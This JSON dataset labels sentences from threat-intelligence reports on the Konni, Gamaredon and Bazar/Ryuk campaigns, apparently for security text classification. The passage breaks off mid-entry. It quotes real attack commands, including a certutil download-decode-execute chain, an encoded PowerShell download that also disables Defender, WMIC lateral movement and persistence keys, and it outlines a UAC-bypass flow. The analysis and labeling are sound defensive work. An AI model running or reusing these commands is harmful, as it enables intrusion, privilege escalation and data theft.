[
    {
        "id": "cti_reports_filtered/r-3.md:::S0",
        "text": "In mid-July 2019 I encountered with an emerging campaign delivering the Konni malware.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S1",
        "text": "The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: \u201c\u041e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0430 \u041a\u043e\u0440\u0435\u0439\u0441\u043a\u043e\u043c \u043f\u043e\u043b\u0443\u043e\u0441\u0442\u0440\u043e\u0432\u0435 \u0438 \u043f\u0435\u0440\u0441\u043f\u0435\u043a\u0442\u0438\u0432\u0430\u0445 \u0434\u0438\u0430\u043b\u043e\u0433\u0430 \u043c\u0435\u0436\u0434\u0443 \u0421\u0428\u0410 \u0438 \u041a\u041d\u0414\u0420\u201d (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S2",
        "text": "Unlike the previously observed campaign, the August campaign potentially targeting Russian language speakers with an interest in Korean Geo-political situation, the lure document used in this campaign is written Cyrillic and contains content related to North Korean American foreign affairs.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S3",
        "text": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S4",
        "text": "This is an indication that the author is a Korean native speaker.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S5",
        "text": "The lure document contains VBA macro code with the following capabilities:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S6",
        "text": "- Changes the font color from light grey to black \u2014 to trick the victim to enable content.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S7",
        "text": "- Checks if windows is a 32 or 64 bit version.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S8",
        "text": "- Constructs and executes the command-line to download additional files\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S9",
        "text": "The document contains 3 hidden text boxes.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S10",
        "text": "Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S11",
        "text": "Full Command Line example: c:\\windows\\system32\\cmd.exe /q /c copy /y %windir%\\system32\\certutil.exe %temp%\\mx.exe && cd /d %temp% && mx -urlcache -split -f http://handicap[.]eu5.org/1.txt && mx -decode -f 1.txt 1.bat && del /f /q 1.txt && 1.bat",
        "type": "IOC"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S12",
        "text": "Certutil is a living-off the land command line utility that can be used to obtain certificate authority information and configure certificate services.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S13",
        "text": "Threat actors usually utilize certutil to download remote files from a given URL.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S14",
        "text": "It also incorporates a built-in function to decode base64-encoded files.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S15",
        "text": "CMD silently copies certutil.exe into temp directory and rename it to \u201cmx.exe\u201d in an attempt to evade detection and then downloads 1.txt from from a remote resource: http://handicap.eu5[.]org.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S16",
        "text": "The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S17",
        "text": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S18",
        "text": "The batch script acts as a second stage downloader and downloads two additional files, depending on the system architecture.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S19",
        "text": "Certutil is executed to download a txt file and decode its content.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S20",
        "text": "Decoding each base64 string (32-bit or 64-bit version) results in a cabinet file \u2014 setup.cab\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S21",
        "text": "The content of the cabinet file is then extracted into %temp% folder, and setup.cab file is deleted from the system.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S22",
        "text": "Install.bat \u2014 acts as installer to ensure persistence and execute mshlpsrvc.dll.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S23",
        "text": "mshlpweb.dll \u2014 acts as loader; responsible to elevate privileges.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S24",
        "text": "mshlpsrvc.dll \u2014 final payload; responsible for data exfiltration.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S25",
        "text": "mshlpsrvc.ini \u2014 configuration file; contains URL used by mshlpsrvc.dll",
        "type": "RELEVENT"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S26",
        "text": "Both dropped DLL files are unsigned and packed with UPX packer.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S27",
        "text": "To check level of permissions, the threat actor uses net.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S28",
        "text": "if the current user has high privileges, install.bat is executed directly.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S29",
        "text": "Otherwise, mshlpweb.dll is executed using rundll32.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S30",
        "text": "mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S31",
        "text": "To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S32",
        "text": "This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S33",
        "text": "mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[2], which in turn execute the installer \u2014 install.bat.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S34",
        "text": "mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S35",
        "text": "Higher privileges are needed to execute the installer, install.bat.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S36",
        "text": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S37",
        "text": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S38",
        "text": "Technique flow:\n",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S39",
        "text": "- wusa.exe is executed in hidden window using ShellExecuteExW;\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S40",
        "text": "- Handle to the access token associated with wusa.exe is created.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S41",
        "text": "- The token object of wusa.exe is duplicated using DuplicateTokenEx.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S42",
        "text": "The threat actor pass \u201cToken_all_access\u201d as desired access, which combines all possible access rights for a token and creates a new impersonation token.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S43",
        "text": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S44",
        "text": "Restricted token is then created and duplicated using NtFilterToken and DuplicateTokenEx respectively.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S45",
        "text": "The new duplicated token is passed to ImpersonateLoggedOnUser.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S46",
        "text": "An elevated cmd instance is spawned using CreateProcessWithLogonW function.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S47",
        "text": "The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S48",
        "text": "I used the James Forshaw\u2019s excellent blog [6] explaining in detail how to bypass UAC using the technique above.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S49",
        "text": "When the installer is executed, it first stops COMSysApp, a service that manages the configuration and tracking of Component Object Model (COM)-based components, using sc.exe utility.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S50",
        "text": "- COMSysApp service is first configured to autostart and the binpath of the service is set to svchost.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S51",
        "text": "- COMSysApp service is added under the \u201cSvcHost\u201d key as a preliminary step to its execution in the context of svchost.exe.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S52",
        "text": "- The malicious DLL is added as a service DLL of COMSysApp.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S53",
        "text": "- COMSysApp service is restarted.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S54",
        "text": "Once COMSysApp service is restarted the malware is loaded in memory, and the batch file is removed from the infected system.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S55",
        "text": "The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S56",
        "text": "After ComSysApp service is restarted, a new instance of svchost.exe is spawned and loads the final payload mshlpsrvc.dll.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S57",
        "text": "mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S58",
        "text": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S59",
        "text": "Prior to execution of any recon command to gather information from the target machine, the default codepage of the console is changed to \u201c65001\u201d (utf-8)\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S60",
        "text": "cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f",
        "type": "IOC"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S61",
        "text": "The following information is gathered from the affected machine and sent back to the control server:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S62",
        "text": "- System info using: cmd /c systeminfo >%temp%\\temp.ini",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S63",
        "text": "- List of running process using: cmd /c tasklist >%temp%\\temp.ini\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S64",
        "text": "- The temp.ini file is then compressed into a cabinet file and saved to C:\\Windows\\TEMP: cmd /c makecab \u201cC:\\Windows\\TEMP\\temp.ini\u201d \u201cC:\\Windows\\TEMP\\temp.cab\u201d\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S65",
        "text": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S66",
        "text": "Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command & control server for this attack.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S67",
        "text": "We\u2019ve observed similar past campaigns where free FTP services were used as the C2 for other Konni and Syscon variants, staring from October 2017.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S68",
        "text": "[5]\n",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S69",
        "text": "The data is exfiltrated in the following way:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S70",
        "text": "- The temp.cab is base64 encoded with the same custom key used earlier.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S71",
        "text": "- Encoded temp.cab is copied to a post.txt under the directory C:\\Windows\\TEMP.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S72",
        "text": "- files uploaded to the control server using \u201cstor\u201d command.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S0",
        "text": "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S1",
        "text": "Opening document starts a template injection technique for loading the document template from the internet.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S2",
        "text": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S3",
        "text": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S4",
        "text": "During the time of the analysis however, the C&C server was not accessible, which made us unable to get additional payloads.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S5",
        "text": "The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S6",
        "text": "One of them even had the subject \u201cCoronavirus (2019-nCoV).\u201d",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S7",
        "text": "The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S8",
        "text": "The email that used the coronavirus-related subject came with an attached document file.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S9",
        "text": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S10",
        "text": "The downloaded document template (in dot format) could differ slightly depending on each download.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S11",
        "text": "However, its Exif info or metadata remains consistent and shares the following details:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S12",
        "text": "As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S13",
        "text": "More specifically it drops \u201c%USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs,\u201d which is hardcoded in the macro, and then executed in \u201cwscript.exe //b %USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs.\u201d\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S14",
        "text": "PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID T1140), which it executes after decrypting the obfuscations.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S15",
        "text": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S16",
        "text": "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts (MITRE ATT&CK framework ID T1060)",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S17",
        "text": "Registry: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\MediaPlayer wscript.exe //b \uff05USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs",
        "type": "IOC"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S18",
        "text": "Connect with \u201chxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php\u201d",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S19",
        "text": "(MITRE ATT&CK framework IDs T1043, T1071, T1082)",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S20",
        "text": "If the downloaded file size in the first step exceeds 10,485 bytes, then the file is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d (MITRE ATT&CK framework ID T1105)",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S21",
        "text": "Use XOR for the file saved from the second step, where ASCII code converted from its own hexadecimal volume serial number is used as the key.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S22",
        "text": "The decrypted result is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d (T1001)",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S23",
        "text": "If the file size of \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d exceeds 4,485 bytes, it is executed.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S24",
        "text": "Both \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d and \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d are then deleted (MITRE ATT&CK framework ID T1107)\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S25",
        "text": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S26",
        "text": "However, the macro generated VBS was obfuscated in this case, likely as an additional evasive tactic.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S27",
        "text": "Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S28",
        "text": "Lines 53 and 54 in figure 6 are for closing those downloaded and decoded TXT and EXE files, which are variables defined right before the IF statement.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S29",
        "text": "If, however, these lines do not pass through this IF statement, an error would occur.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S30",
        "text": "It shows that this malware is not tested enough, and may still be under development.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S31",
        "text": "Our analysis found several URLs of the network destinations for both template injection and VBS.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S32",
        "text": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S33",
        "text": "Network destination for template injection: 176[.]119[.]147[.]225\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S34",
        "text": "Network destination for VBS: 176[.]57[.]215[.]115\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S35",
        "text": "These IP addresses are from Russian hosting companies.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S36",
        "text": "Most likely, the attackers rented Virtual Private Server (VPS) as their attack base.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S37",
        "text": "Their URL for VBS (shown below) likely includes the data when they conducted the attack.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S38",
        "text": "hxxp://{FQDN}/{computer name}_{hexadecimal volume serial number}/help_{day}_{month}[.]php",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S0",
        "text": "In this case, the actions began via a loader malware known as Bazar/Kegtap.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S1",
        "text": "Reports indicate an email delivery via malspam, which has been creeping up in volume over the month of September.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S2",
        "text": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S3",
        "text": "The initial goal of this activity was to run discovery using built in Windows utilities like nltest, net group, and the 3rd party utility AdFind.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S4",
        "text": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S5",
        "text": "Again, the same tools were employed in the second round of discovery, plus Rubeus.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S6",
        "text": "This time the discovery collection was exfiltrated via FTP to a server hosted in Russia.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S7",
        "text": "Next, the threat actor began to move laterally.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S8",
        "text": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S9",
        "text": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S10",
        "text": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S11",
        "text": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S12",
        "text": "The server utilized for backups in the domain was targeted first for encryption, with some further preparation completed on the host.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S13",
        "text": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S14",
        "text": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S15",
        "text": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S16",
        "text": "If a defender missed the first day of recon, they would have had a little over 3 hours to respond before being ransomed.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S17",
        "text": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S18",
        "text": "Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S19",
        "text": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S20",
        "text": "Service execution was used several times to execute scripts and executables during lateral movement.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S21",
        "text": "WMI was used as well in an attempt to execute dlls laterally.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S22",
        "text": "WMIC /node:\"DC.example.domain\" process call create \"rundll32 C:\\PerfLogs\\arti64.dll, StartW\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S23",
        "text": "The threat actors also performed process injection.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S24",
        "text": "Disabling Windows Defender.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S25",
        "text": "powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA3ADgAMAAxAC8AJwApADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S26",
        "text": "AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S27",
        "text": "We\u2019ve seen adf.bat numerous times and you can read more about it here.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S28",
        "text": "The batch file outputs information into the following text files.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S29",
        "text": "Nltest was used to check for Domain trusts",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S30",
        "text": "nltest /domain_trusts /all_trusts",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S31",
        "text": "Net was used to show Domain Admins",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S32",
        "text": "net group \"Domain admins\" /DOMAIN",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S33",
        "text": "Ping was used to test if systems were up in the environment",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S34",
        "text": "ping hostname.domain.local",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S35",
        "text": "Afind was run again, and then the threat actor attempted to Kerberoast using Rubeus.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S36",
        "text": "After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S37",
        "text": "- systeminfo",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S38",
        "text": "- nltest /dclist:",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S39",
        "text": "- Get-NetSubnet\n",
        "type": "FUNCTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S40",
        "text": "- Get-NetComputer -operatingsystem *server*\n",
        "type": "FUNCTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S41",
        "text": "- Invoke-CheckLocalAdminAccess\n",
        "type": "FUNCTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S42",
        "text": "- Find-LocalAdminAccess",
        "type": "FUNCTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S43",
        "text": "WMI was used to check for the current AntiVirus on numerous systems\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S44",
        "text": "WMIC /Node:localhost /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S45",
        "text": "Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate | Export-CSV C:\\Users\\AllWindows.csv -NoTypeInformation -Encoding UTF8\n",
        "type": "FUNCTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S46",
        "text": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S47",
        "text": "The system was not vulnerable to MS17-010\n",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S48",
        "text": "Lateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S49",
        "text": "From there, the threat actor used WMIC to execute the beacon.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S50",
